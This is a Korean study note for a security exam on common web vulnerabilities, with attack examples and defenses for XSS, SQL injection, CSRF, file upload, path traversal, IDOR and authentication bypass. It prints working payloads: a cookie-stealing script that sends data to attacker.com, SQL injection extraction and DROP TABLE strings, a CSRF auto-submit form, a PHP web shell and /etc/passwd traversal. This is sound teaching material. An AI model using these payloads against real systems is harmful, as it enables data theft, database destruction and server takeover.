# 03. 주요 웹 취약점 — 공격과 대응

> OWASP Top 10 기반 주요 웹 취약점 정리. ⭐ = 시험 출제 예상

---

## ⭐ 1. XSS (Cross-Site Scripting)

### 정의
악의적인 스크립트를 웹 페이지에 삽입해 다른 사용자의 브라우저에서 실행시키는 공격

### XSS 3가지 유형 ⭐

| 유형 | 원리 | 특징 |
|------|------|------|
| **Stored XSS** | 악성 스크립트를 DB에 저장 → 다른 사용자가 페이지 조회 시 실행 | 지속적, 파급력 큼 |
| **Reflected XSS** | 요청에 포함된 스크립트가 응답에 그대로 반사 | URL 클릭 유도 |
| **DOM-based XSS** | 서버 응답 없이 클라이언트 측 DOM 조작으로 실행 | 서버 로그에 안 남음 |

### 공격 예시

```html
<!-- 쿠키 탈취 -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

<!-- alert 테스트 -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

### 인코딩 우회 기법

```html
<!-- 대소문자 혼용 -->
<ScRiPt>alert('XSS')</sCrIpT>

<!-- HTML 엔티티 인코딩 -->
&#60;script&#62;alert('XSS')&#60;/script&#62;

<!-- 이벤트 핸들러 활용 -->
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
```

### 방어 기법 ⭐

| 방어 | 설명 |
|------|------|
| **입력값 검증** | 특수문자(`<`, `>`, `"`, `'`) 필터링 |
| **출력값 인코딩** | HTML 엔티티 변환 (`<` → `&lt;`) |
| **HttpOnly 쿠키** | 스크립트로 쿠키 접근 차단 |
| **CSP** | Content Security Policy 헤더 설정 |
| **WAF** | 웹 방화벽으로 XSS 패턴 차단 |

## ⭐ 2. SQL Injection

### 정의
사용자 입력이 SQL 쿼리에 검증 없이 삽입될 때 발생하는 공격

### 공격 5단계 흐름

```sql
-- 1단계: 컬럼 수 파악 (ORDER BY)
ORDER BY 1   -- 정상
ORDER BY 2   -- 정상
ORDER BY 3   -- 에러 → 컬럼 수는 2개

-- 2단계: 출력 위치 파악
' UNION SELECT 1,2-- -

-- 3단계: DB 정보 수집
' UNION SELECT database(),2-- -
' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema='dvwa'-- -
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -

-- 4단계: 데이터 추출
' UNION SELECT user,password FROM users-- -
```

### SQLi 유형 5가지 ⭐

| 유형 | 조건 | 대표 페이로드 |
|------|------|-------------|
| **Error-based** | DB 에러가 화면에 출력 | `' extractvalue(1,concat(0x7e,database()))-- -` |
| **UNION-based** | SELECT 결과가 화면에 출력 | `' UNION SELECT 1,2-- -` |
| **Boolean Blind** | 참/거짓에 따라 화면이 달라짐 | `' AND substr(database(),1,1)='d'-- -` |
| **Time Blind** | 화면 변화 없음 | `' AND sleep(3)-- -` |
| **Stacked Query** | 세미콜론으로 쿼리 추가 실행 | `'; DROP TABLE users-- -` |

### 방어 기법 ⭐

```php
// ❌ 취약
$sql = "SELECT * FROM users WHERE id = '$_GET[id]'";

// ✅ 안전 — Prepared Statement
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("s", $_GET['id']);
$stmt->execute();
```

## ⭐ 3. CSRF (Cross-Site Request Forgery)

### 정의
인증된 사용자가 자신의 의지와 무관하게 공격자가 의도한 요청을 서버에 전송하게 만드는 공격

### 공격 흐름

```
① 피해자가 은행 사이트에 로그인 (세션 쿠키 보유)
② 공격자가 만든 악성 페이지 클릭
③ 악성 페이지에서 은행으로 자동 요청 전송 (쿠키 자동 첨부)
④ 은행 서버는 정상 요청으로 처리 → 계좌 이체 실행
```

```html
<!-- 악성 페이지 예시 -->
<img src="http://bank.com/transfer?to=attacker&amount=1000000">
<form action="http://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker">
  <input name="amount" value="1000000">
</form>
<script>document.getElementById('f').submit();</script>
```

### XSS vs CSRF 비교 ⭐

| 구분 | XSS | CSRF |
|------|-----|------|
| 공격 대상 | **사용자 브라우저** | **서버** |
| 인증 필요 | 불필요 | 피해자가 로그인 상태여야 함 |
| 실행 위치 | 클라이언트 | 서버 |

### 방어 기법 ⭐

| 방어 | 설명 |
|------|------|
| **CSRF Token** | 요청마다 랜덤 토큰 검증 (가장 효과적) |
| **Referer 검증** | 요청 출처 확인 |
| **SameSite 쿠키** | 외부 사이트에서 쿠키 전송 차단 |
| **재인증** | 중요 작업 전 비밀번호 재확인 |

## ⭐ 4. 파일 업로드 취약점

### 정의
파일 업로드 기능에서 악성 파일(웹쉘)을 업로드해 서버에서 실행시키는 공격

### 공격 흐름

```
① 웹쉘(.php) 업로드 시도
② 서버에 파일 저장
③ 업로드된 URL 접근 → 웹쉘 실행
④ 서버 명령어 실행 가능
```

```php
<!-- 웹쉘 예시 -->
<?php system($_GET["cmd"]); ?>

<!-- 접근: http://target.com/upload/shell.php?cmd=id -->
```

### 필터 우회 기법 ⭐

| 기법 | 예시 |
|------|------|
| 대소문자 변경 | `.PHP`, `.Php` |
| 이중 확장자 | `shell.php.jpg` |
| MIME 타입 변조 | Content-Type: `image/jpeg` |
| 널바이트 삽입 | `shell.php%00.jpg` |
| 특수 확장자 | `.phtml`, `.php5`, `.phar` |
| `.htaccess` 업로드 | 특정 확장자를 PHP로 실행하도록 설정 |

### 방어 기법 ⭐

| 방어 | 설명 |
|------|------|
| **화이트리스트 확장자** | jpg, png, gif 등 허용 확장자만 허용 |
| **MIME 타입 검증** | 파일 헤더(Magic Byte) 확인 |
| **업로드 경로 격리** | 웹 루트 외부에 저장 |
| **파일명 랜덤화** | UUID 등으로 변경하여 저장 |
| **실행 권한 제거** | 업로드 폴더에 실행 권한 없애기 |

## ⭐ 5. 파일 다운로드(경로 탐색) 취약점

### 정의
`../`(디렉터리 트래버설)를 이용해 서버의 임의 파일을 다운로드하는 공격

### 공격 예시

```
# 일반 요청
http://target.com/download?file=report.pdf

# 공격 — /etc/passwd 읽기
http://target.com/download?file=../../../etc/passwd
http://target.com/download?file=....//....//etc/passwd  (필터 우회)
```

### 방어 기법

| 방어 | 설명 |
|------|------|
| **경로 정규화** | `../` 제거 후 허용 디렉터리 내인지 확인 |
| **화이트리스트** | 허용 파일 목록만 다운로드 허용 |
| **파일명 간접 참조** | DB에 저장된 ID로만 파일 참조 |

## ⭐ 6. 불충분한 인가 (IDOR)

### 정의
다른 사용자의 리소스를 인가 검증 없이 접근할 수 있는 취약점 (Insecure Direct Object Reference)

### 공격 예시

```
# 정상 요청 (본인 주문)
http://shop.com/order?id=1001

# 공격 (타인 주문 조회 — 숫자만 변경)
http://shop.com/order?id=1002
http://shop.com/order?id=1003
```

### 수평적 vs 수직적 권한 상승 ⭐

| 구분 | 설명 |
|------|------|
| **수평적 권한 상승** | 동일 권한의 다른 사용자 리소스 접근 |
| **수직적 권한 상승** | 더 높은 권한(관리자 등)으로 상승 |

### 방어 기법

| 방어 | 설명 |
|------|------|
| **서버 측 인가 검증** | 요청마다 세션과 리소스 소유자 비교 |
| **간접 참조** | 외부에는 UUID 사용, 내부에서 실제 ID로 변환 |
| **접근 로그 감시** | 비정상적인 ID 순차 접근 탐지 |

## 7. 인증 우회

### 주요 기법

| 기법 | 설명 |
|------|------|
| **기본 계정 사용** | admin/admin, root/root 등 |
| **SQL Injection 로그인 우회** | `' OR '1'='1'-- -` |
| **쿠키 변조** | `isAdmin=false` → `isAdmin=true` |
| **JWT 조작** | 알고리즘 none 공격, 서명 변조 |

```sql
-- 로그인 우회 페이로드
ID: admin'-- -
PW: (아무거나)

-- 동작: SELECT * FROM users WHERE id='admin'-- -' AND pw='...'
```

## 8. 보안 설정 미흡

### 주요 항목

| 항목 | 취약 | 양호 |
|------|------|------|
| **디렉터리 인덱싱** | On (파일 목록 노출) | Off |
| **에러 메시지** | DB 정보, 스택 트레이스 노출 | 커스텀 에러 페이지 |
| **불필요한 HTTP 메서드** | PUT, DELETE 허용 | GET, POST만 허용 |
| **서버 버전 노출** | Server: Apache/2.4.1 헤더 노출 | 헤더 제거 |
| **기본 계정** | admin/admin 사용 | 변경 필수 |

## ⭐ 핵심 요약 비교표

| 취약점 | 공격 목표 | 핵심 방어 |
|--------|---------|---------|
| **XSS** | 사용자 브라우저 스크립트 실행 | 출력값 인코딩, HttpOnly 쿠키 |
| **SQL Injection** | DB 데이터 탈취·조작 | **Prepared Statement** |
| **CSRF** | 인증된 사용자의 의도치 않은 요청 | **CSRF Token** |
| **파일 업로드** | 서버에 웹쉘 업로드 | 화이트리스트 확장자, 실행 권한 제거 |
| **파일 다운로드** | 서버 임의 파일 접근 | `../` 필터링, 화이트리스트 |
| **IDOR** | 타 사용자 리소스 접근 | 서버 측 인가 검증 |
| **인증 우회** | 인증 없이 로그인 | 기본 계정 변경, Prepared Statement |
